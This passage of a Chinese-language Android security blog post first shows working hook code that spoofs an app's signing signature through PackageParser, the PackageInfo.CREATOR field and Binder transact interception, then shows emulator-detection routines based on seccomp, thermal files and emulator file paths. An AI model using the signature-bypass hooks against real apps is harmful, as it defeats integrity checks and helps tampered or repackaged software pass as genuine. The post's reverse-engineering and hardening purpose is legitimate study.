(packageInfo.packageName.equals(RuntimeToolKit.packageName)) &#123;</span><br><span class="line">                            if (packageInfo.signatures != null &amp;&amp; packageInfo.signatures.length &gt; 0) &#123;</span><br><span class="line">                                CLog.i(&quot;PackageParser signature info (method 1)&quot;);</span><br><span class="line">                                packageInfo.signatures[0] = fakeSignature[0];</span><br><span class="line">                            &#125;</span><br><span class="line">                            if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P) &#123;</span><br><span class="line">                                if (packageInfo.signingInfo != null) &#123;</span><br><span class="line">                                    CLog.i(&quot;PackageParser signature info (method 2)&quot;);</span><br><span class="line">                                    Signature[] signaturesArray = packageInfo.signingInfo.getApkContentsSigners();</span><br><span class="line">                                    if (signaturesArray != null &amp;&amp; signaturesArray.length &gt; 0) &#123;</span><br><span class="line">                                        signaturesArray[0] = fakeSignature[0];</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        CLog.e(&quot;hook apkSign PackageParser -&gt; generatePackageInfo &quot; + e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="替换CREATOR"><a href="#替换CREATOR" class="headerlink" title="替换CREATOR"></a>替换CREATOR</h5><p>这个思路也是抄的<code>lspatch</code> ，这种思路可以通过检测<code>CREATOR</code> 变量<code>Classloader</code>的方式检测出来 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public static void byPassSignatureForCREATOR(Signature[] fakeSignature) &#123;</span><br><span class="line">    if (fakeSignature == null) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    Parcelable.Creator&lt;PackageInfo&gt; originalCreator = PackageInfo.CREATOR;</span><br><span class="line">    Parcelable.Creator&lt;PackageInfo&gt; proxiedCreator = new Parcelable.Creator&lt;PackageInfo&gt;() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public PackageInfo createFromParcel(Parcel source) &#123;</span><br><span class="line">            PackageInfo packageInfo = originalCreator.createFromParcel(source);</span><br><span class="line">            if (packageInfo.packageName.equals(RuntimeToolKit.packageName)) &#123;</span><br><span class="line">                if (packageInfo.signatures != null &amp;&amp; packageInfo.signatures.length &gt; 0) &#123;</span><br><span class="line">                    //CLog.i(&quot;CREATOR Replace signature info (method 1)&quot;);</span><br><span class="line">                    packageInfo.signatures[0] = fakeSignature[0];</span><br><span class="line">                &#125;</span><br><span class="line">                if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P) &#123;</span><br><span class="line">                    if (packageInfo.signingInfo != null) &#123;</span><br><span class="line">                        //CLog.i(&quot;CREATOR Replace signature info (method 2)&quot;);</span><br><span class="line">                        Signature[] signaturesArray = packageInfo.signingInfo.getApkContentsSigners();</span><br><span class="line">                        if (signaturesArray != null &amp;&amp; signaturesArray.length &gt; 0) &#123;</span><br><span class="line">                            signaturesArray[0] = fakeSignature[0];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return packageInfo;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        @Override</span><br><span class="line">        public PackageInfo[] newArray(int size) &#123;</span><br><span class="line">            return originalCreator.newArray(size);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    RposedHelpers.setStaticObjectField(PackageInfo.class, &quot;CREATOR&quot;, proxiedCreator);</span><br><span class="line">    try &#123;</span><br><span class="line">        Map&lt;?, ?&gt; mCreators = (Map&lt;?, ?&gt;) RposedHelpers.getStaticObjectField(Parcel.class, &quot;mCreators&quot;);</span><br><span class="line">        mCreators.clear();</span><br><span class="line">    &#125; catch (NoSuchFieldError ignore) &#123;</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        CLog.e(&quot;fail to clear Parcel.mCreators&quot;, e);</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        Map&lt;?, ?&gt; sPairedCreators = (Map&lt;?, ?&gt;)</span><br><span class="line">                RposedHelpers.getStaticObjectField(Parcel.class,</span><br><span class="line">                        &quot;sPairedCreators&quot;);</span><br><span class="line">        sPairedCreators.clear();</span><br><span class="line">    &#125; catch (NoSuchFieldError ignore) &#123;</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        CLog.e(&quot;fail to clear Parcel.sPairedCreators&quot;, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Binder-transact-方法"><a href="#Binder-transact-方法" class="headerlink" title="Binder transact 方法"></a>Binder transact 方法</h5><p>有很多大厂会自己伪造IPC和服务端进行通讯，用这种方法可以进行签名的修改和替换，实现思路主要就是<code>Hook binder</code>通讯解析的方法 。判断如果传输类型数据是获取签名的话就进行替换 。主要思路就是<code>Hook</code>传输数据的“水管”，对水管里面的内容进行替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">RposedHelpers.findAndHookMethod(&quot;android.os.BinderProxy&quot;, // 目标类名</span><br><span class="line">        context.getClassLoader(),  // 类加载器</span><br><span class="line">        &quot;transact&quot;,                // 目标方法名</span><br><span class="line">        int.class,</span><br><span class="line">        Parcel.class,</span><br><span class="line">        Parcel.class,</span><br><span class="line">        int.class,</span><br><span class="line">        new RC_MethodHook() &#123; // Hook 回调逻辑</span><br><span class="line">            @Override</span><br><span class="line">            protected void afterHookedMethod(MethodHookParam param) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Object object = param.thisObject;</span><br><span class="line">                    int id = (int) param.args[0];    // 事务码 </span><br><span class="line">                    Parcel write = (Parcel) param.args[1];  // 请求数据 (data)</span><br><span class="line">                    Parcel out = (Parcel) param.args[2];    // 响应数据 (reply)</span><br><span class="line">                    // forward check</span><br><span class="line">                    if (write == null || out == null) &#123;</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line">                    // prevent recurise call (防止递归)</span><br><span class="line">                    if (id == IBinder.INTERFACE_TRANSACTION) &#123;</span><br><span class="line">                        //IBinder协议事务代码：询问事务的收件人端以获取其规范接口描述符。</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line"> </span><br><span class="line">                    String desc = (String) RposedHelpers.callMethod(object, &quot;getInterfaceDescriptor&quot;);</span><br><span class="line">                    if (desc == null || !desc.equals(&quot;android.content.pm.IPackageManager&quot;)) &#123; // 筛选服务</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (id == TRANSACTION_getPackageInfo_ID) &#123; // 筛选目标操作</span><br><span class="line">                        out.readException();             // 读取和解析原始结果</span><br><span class="line">                        if (0 != out.readInt()) &#123;  // 检查是否有有效的 PackageInfo 返回</span><br><span class="line">                            PackageInfo packageInfo = PackageInfo.CREATOR.createFromParcel(out);  // 从 Parcel 中反序列化出 PackageInfo 对象  </span><br><span class="line">                            if (packageInfo.packageName.equals(context.getApplicationInfo().packageName)) &#123;</span><br><span class="line">                                if (fakeSignature[0] == null) &#123;</span><br><span class="line">                                    CLog.e(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; byPassSignature fakeSignature == null&quot;);</span><br><span class="line">                                    System.exit(0);</span><br><span class="line">                                    return;</span><br><span class="line">                                &#125;</span><br><span class="line">                                //CLog.i( &quot;org data size -&gt;  &quot;+out.dataSize());</span><br><span class="line"> </span><br><span class="line">                                if (packageInfo.signatures != null &amp;&amp; packageInfo.signatures.length &gt; 0) &#123; </span><br><span class="line">                                    packageInfo.signatures[0] = fakeSignature[0];</span><br><span class="line">                                    //CLog.i(&quot; byPassSignatureByLSPosed 1 !!&quot;);</span><br><span class="line">                                &#125;</span><br><span class="line">                                // 核心:替换签名 </span><br><span class="line">                                if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P) &#123;</span><br><span class="line">                                    if (packageInfo.signingInfo != null) &#123;</span><br><span class="line">                                        Signature[] signaturesArray = packageInfo.signingInfo.getApkContentsSigners();</span><br><span class="line">                                        if (signaturesArray != null &amp;&amp; signaturesArray.length &gt; 0) &#123;</span><br><span class="line">                                            signaturesArray[0] = fakeSignature[0];</span><br><span class="line">                                            //CLog.i( &quot; byPassSignatureByLSPosed 2 !!&quot;);</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                           // 将修改后的结果写回 Parcel</span><br><span class="line">                                out.setDataPosition(0);</span><br><span class="line">                                out.setDataSize(0);</span><br><span class="line">                                out.writeNoException();</span><br><span class="line">                                out.writeInt(1);</span><br><span class="line">                                packageInfo.writeToParcel(out, PARCELABLE_WRITE_RETURN_VALUE);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                        // reset pos 重置读写位置</span><br><span class="line">                        out.setDataPosition(0);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                catch (Throwable err) &#123;</span><br><span class="line">                    CLog.e(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; byPassSignatureByLSPosed error &quot; + err.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>还有很多很好思路的代码 ，比如<code>ISO</code>线程去读取<code>apk</code>签名信息，防止<code>SVC</code>被<code>IO</code>重定向掉 。</p><blockquote><ul><li><strong><code>&quot;android.os.BinderProxy&quot;</code></strong>: 这是要 Hook 的目标类。<code>BinderProxy</code> 是客户端（应用进程）中 Binder 远程服务的一个代理对象。当你的应用调用一个系统服务（如 <code>PackageManagerService</code>）时，实际上是调用了本地 <code>BinderProxy</code> 对象的方法</li><li><code>transact</code> 方法是 Binder 通信的核心。所有跨进程的数据请求和响应都会经过这个方法</li><li>在确定了是发往 <code>PackageManagerService</code> 的通信后，我们再通过事务码 <code>id</code> 来判断具体的操作，<code>TRANSACTION_getPackageInfo_ID</code> (这个常量需要在别处定义) 明确告诉我们，这是一个获取 <code>PackageInfo</code> 的请求</li><li><code>PackageInfo.CREATOR.createFromParcel(out)</code>: 这是安卓 <code>Parcelable</code> 机制的标准用法，将 <code>Parcel</code> 中的二进制数据反序列化成一个 <code>PackageInfo</code> Java 对象</li><li><code>packageInfo.signatures[0] = fakeSignature[0]</code>: 在旧版 Android 中，签名信息直接存储在 <code>PackageInfo</code> 的 <code>signatures</code> 数组里。这里直接将第一个签名替换成我们预先准备好的 <code>fakeSignature</code></li><li><code>if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P)</code>: 从 Android 9 (Pie) 开始，引入了 <code>SigningInfo</code> 类来更好地支持多签名和签名轮换。因此，为了兼容新系统，必须同时修改 <code>SigningInfo</code> 里面的签名信息。这段代码处理了高版本的兼容性问题</li></ul></blockquote><h3 id="模拟器检测-1"><a href="#模拟器检测-1" class="headerlink" title="模拟器检测"></a>模拟器检测</h3><p>Java层基础的获取api架构啥的</p><h4 id="Seccomp检测架构"><a href="#Seccomp检测架构" class="headerlink" title="Seccomp检测架构"></a>Seccomp检测架构</h4><p>主要思路来自B哥 ，感谢B哥 ，先安装<code>seccomp</code>架子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">void install_check_arch_seccomp() &#123;</span><br><span class="line">    struct sock_filter filter[15] = &#123;</span><br><span class="line">            BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (uint32_t) offsetof(struct seccomp_data, nr)),</span><br><span class="line">            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_getpid, 0, 12),</span><br><span class="line">            BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (uint32_t) offsetof(struct seccomp_data, args[0])),</span><br><span class="line">            BPF_JUMP(BPF_JMP + BPF_JEQ, DetectX86Flag, 0, 10),</span><br><span class="line">            BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (uint32_t) offsetof(struct seccomp_data, arch)),</span><br><span class="line">            BPF_JUMP(BPF_JMP + BPF_JEQ, AUDIT_ARCH_X86_64, 0, 1),</span><br><span class="line">            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (864 &amp; SECCOMP_RET_DATA)),</span><br><span class="line">            BPF_JUMP(BPF_JMP + BPF_JEQ, AUDIT_ARCH_I386, 0, 1),</span><br><span class="line">            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (386 &amp; SECCOMP_RET_DATA)),</span><br><span class="line">            BPF_JUMP(BPF_JMP + BPF_JEQ, AUDIT_ARCH_ARM, 0, 1),</span><br><span class="line">            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (0xA32 &amp; SECCOMP_RET_DATA)),</span><br><span class="line">            BPF_JUMP(BPF_JMP + BPF_JEQ, AUDIT_ARCH_AARCH64, 0, 1),</span><br><span class="line">            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (0xA64 &amp; SECCOMP_RET_DATA)),</span><br><span class="line">            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (6 &amp; SECCOMP_RET_DATA)),</span><br><span class="line">            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW)</span><br><span class="line"> </span><br><span class="line">    &#125;;</span><br><span class="line">    struct sock_fprog program = &#123;</span><br><span class="line">            .len = (unsigned short) (sizeof(filter) / sizeof(filter[0])),</span><br><span class="line">            .filter = filter</span><br><span class="line">    &#125;;</span><br><span class="line">    errno = 0;</span><br><span class="line">    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) &#123;</span><br><span class="line">        LOG(ERROR) &lt;&lt; &quot;prctl(PR_SET_NO_NEW_PRIVS) &quot; &lt;&lt; strerror(errno);</span><br><span class="line">    &#125;</span><br><span class="line">    errno = 0;</span><br><span class="line">    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;program)) &#123;</span><br><span class="line">        LOG(ERROR) &lt;&lt; &quot;prctl(PR_SET_SECCOMP) &quot; &lt;&lt; strerror(errno);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol><li><strong>Seccomp (Secure Computing Mode)</strong>: 这是Linux内核的一项安全功能，用于限制进程可以调用的系统调用（syscall）。它有两种模式：<ul><li><code>SECCOMP_MODE_STRICT</code>: 极度严格，只允许 <code>read</code>, <code>write</code>, <code>sigreturn</code>, <code>exit</code> 四个系统调用。</li><li><code>SECCOMP_MODE_FILTER</code>: 允许用户提供一个 BPF 程序，内核会对进程的每一次系统调用都运行这个 BPF 程序，由程序来决定是允许、拒绝、还是执行其他操作。本代码使用的就是这种模式。</li></ul></li><li><strong>BPF (Berkeley Packet Filter)</strong>: BPF 是一种在内核中运行的、功能强大的虚拟机。虽然它最初是为过滤网络数据包而设计的，但现在已被广泛用于内核的各个子系统，包括 seccomp。它执行一组简单的指令（BPF字节码），对输入数据进行判断。在 seccomp 的上下文中，这个“输入数据”就是 <code>struct seccomp_data</code>，包含了当前系统调用的所有信息。</li><li><strong><code>prctl()</code> 系统调用</strong>: 这是一个用于控制进程行为的通用系统调用。代码中用到了它的两个选项：<ul><li><code>PR_SET_NO_NEW_PRIVS</code>: 这是安装 seccomp 过滤器前的<strong>关键安全步骤</strong>。将其设置为 1 后，当前进程及其子进程将无法通过 <code>execve</code> 等方式获得比当前更高的权限（例如，通过执行 SUID 程序）。这可以防止恶意代码利用漏洞来绕过 seccomp 限制。</li><li><code>PR_SET_SECCOMP</code>: 用于实际安装 seccomp 过滤器。</li></ul></li></ol></blockquote><p>总结：这段代码通过 Seccomp-BPF 实现了一个非常规但高效的架构检测机制。它选择了一个几乎无害的系统调用 (<code>getpid</code>)，并为其增加了一个“隐藏功能”：当以特定方式调用时，它不再返回进程ID，而是通过返回一个特定的 <code>errno</code> 来<strong>报告CPU架构</strong>。这种方法在高度沙箱化的环境中非常有用，因为在这些环境中，像执行 <code>uname</code> 命令或读取 <code>/proc</code> 文件系统等常规的检测方法可能都已被禁止。</p><p>配合上面的代码 。启动调用<code>getpid</code>， 上面的架子会对<code>getpid</code>函数进行拦截 ，然后架构进行判断 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">string check_arch_by_seccomp() &#123;</span><br><span class="line">    if (get_sdk_level() &lt; __ANDROID_API_N_MR1__)&#123;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    errno = 0;</span><br><span class="line">    syscall(__NR_getpid, DetectX86Flag);</span><br><span class="line">    if (errno == 386) &#123;</span><br><span class="line">        return &quot;I386设备&quot;;</span><br><span class="line">    &#125; else if (errno == 864) &#123;</span><br><span class="line">        return &quot;X86_64设备&quot;;</span><br><span class="line">    &#125; else if (errno == 0xA32 || errno == 0xA64) &#123;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;else if (errno == 0) &#123;</span><br><span class="line">        //可能是没有开启seccomp</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return (&quot;疑似X86模拟器设备&quot;+ to_string(errno));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检测温度挂载文件"><a href="#检测温度挂载文件" class="headerlink" title="检测温度挂载文件"></a><strong>检测温度挂载文件</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int thermal_check() &#123;</span><br><span class="line">    DIR *dir_ptr;</span><br><span class="line">    int count = 0;</span><br><span class="line">    struct dirent *entry;</span><br><span class="line">    if ((dir_ptr = opendir(&quot;/sys/class/thermal/&quot;)) != nullptr) &#123;</span><br><span class="line">        while ((entry = readdir(dir_ptr))) &#123;</span><br><span class="line">            if (!strcmp(entry-&gt;d_name, &quot;.&quot;) || !strcmp(entry-&gt;d_name, &quot;..&quot;)) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            char *tmp = entry-&gt;d_name;</span><br><span class="line">            if (strstr(tmp, &quot;thermal_zone&quot;) != nullptr) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        closedir(dir_ptr);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        count = -1;</span><br><span class="line">    &#125;</span><br><span class="line">    return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="模拟器特征文件"><a href="#模拟器特征文件" class="headerlink" title="模拟器特征文件"></a><strong>模拟器特征文件</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">string simulator_files_check() &#123;</span><br><span class="line">    if (file_exist(&quot;/system/bin/androVM-prop&quot;)) &#123;//检测androidVM</span><br><span class="line">        return &quot;/system/bin/androVM-prop&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/bin/microvirt-prop&quot;)) &#123;//检测逍遥模拟器--新版本找不到特征</span><br><span class="line">        return &quot;/system/bin/microvirt-prop&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/lib/libdroid4x.so&quot;)) &#123;//检测海马模拟器</span><br><span class="line">        return &quot;/system/lib/libdroid4x.so&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/bin/windroyed&quot;)) &#123;//检测文卓爷模拟器</span><br><span class="line">        return &quot;/system/bin/windroyed&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/bin/nox-prop&quot;)) &#123;//检测夜神模拟器--某些版本找不到特征</span><br><span class="line">        return &quot;/system/bin/nox-prop&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;system/lib/libnoxspeedup.so&quot;)) &#123;//检测夜神模拟器</span><br><span class="line">        return &quot;system/lib/libnoxspeedup.so&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/bin/ttVM-prop&quot;)) &#123;//检测天天模拟器</span><br><span class="line">        return &quot;/system/bin/ttVM-prop&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/data/.bluestacks.prop&quot;)) &#123;//检测bluestacks模拟器  51模拟器</span><br><span class="line">        return &quot;/data/.bluestacks.prop&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/bin/duosconfig&quot;)) &#123;//检测AMIDuOS模拟器</span><br><span class="line">        return &quot;/system/bin/duosconfig&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/etc/xxzs_prop.sh&quot;)) &#123;//检测星星模拟器</span><br><span class="line">        return &quot;/system/etc/xxzs_prop.sh&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/etc/mumu-configs/device-prop-configs/mumu.config&quot;)) &#123;//网易MuMu模拟器</span><br><span class="line">        return &quot;/system/etc/mumu-configs/device-prop-configs/mumu.config&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/priv-app/ldAppStore&quot;)) &#123;//雷电模拟器</span><br><span class="line">        return &quot;/system/priv-app/ldAppStore&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;system/bin/ldinit&quot;) &amp;&amp; file_exist(&quot;system/bin/ldmountsf&quot;)) &#123;//雷电模拟器</span><br><span class="line">        return &quot;system/bin/ldinit&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/app/AntStore&quot;) &amp;&amp; file_exist(&quot;/system/app/AntLauncher&quot;)) &#123;//小蚁模拟器</span><br><span class="line">        return &quot;/system/app/AntStore&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;vmos.prop&quot;)) &#123;//vmos虚拟机</span><br><span class="line">        return &quot;vmos.prop&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;fstab.titan&quot;) &amp;&amp; file_exist(&quot;init.titan.rc&quot;)) &#123;//光速虚拟机</span><br><span class="line">        return &quot;fstab.titan&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;x8.prop&quot;)) &#123;//x8沙箱和51虚拟机</span><br><span class="line">        return &quot;x8.prop&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/lib/libc_malloc_debug_qemu.so&quot;)) &#123;//AVD QEMU</span><br><span class="line">        return &quot;/system/lib/libc_malloc_debug_qemu.so&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    LOGD(&quot;simulator file check info not find  &quot;);</span><br><span class="line">    return &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="模拟器基础特征"><a href="#模拟器基础特征" class="headerlink" title="模拟器基础特征"></a>模拟器基础特征</h4><p>这块思路主要来自非虫 ，在次感谢 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 